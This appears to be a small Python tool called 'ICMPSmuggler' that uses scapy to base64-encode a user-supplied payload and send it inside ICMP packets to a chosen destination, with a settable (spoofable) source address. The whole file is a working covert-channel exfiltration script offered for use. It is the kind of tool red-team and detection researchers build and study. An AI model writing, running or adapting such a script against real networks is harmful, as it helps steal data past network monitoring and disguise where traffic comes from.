import sys
import base64
import argparse
from scapy.all import Ether, IP, ICMP, sr1, Raw

def encodeData(input, type="b64"):
    if type == "b64":
        return base64.b64encode(input)
    


def main(): 
    
    parser = argparse.ArgumentParser(
        prog="ICMPSmuggler",
        description="Smuggling data through ICMP"
    )
    
    parser.add_argument('-s', '--src', required=True)
    parser.add_argument('-d', '--dst', required=True)
    parser.add_argument('-p', '--payload', required=True)
    parser.add_argument('-e', '--enc')
    
    args = parser.parse_args()
    src = args.src
    dst = args.dst
    payload = args.payload
    if args.enc == "b64":
        encodedPayload = encodeData(str.encode(payload), "b64")        
        p = sr1(IP(dst=dst , src=src)/ ICMP() / (encodedPayload))
        if p: 
            p.show()


if __name__ == "__main__":
    main()
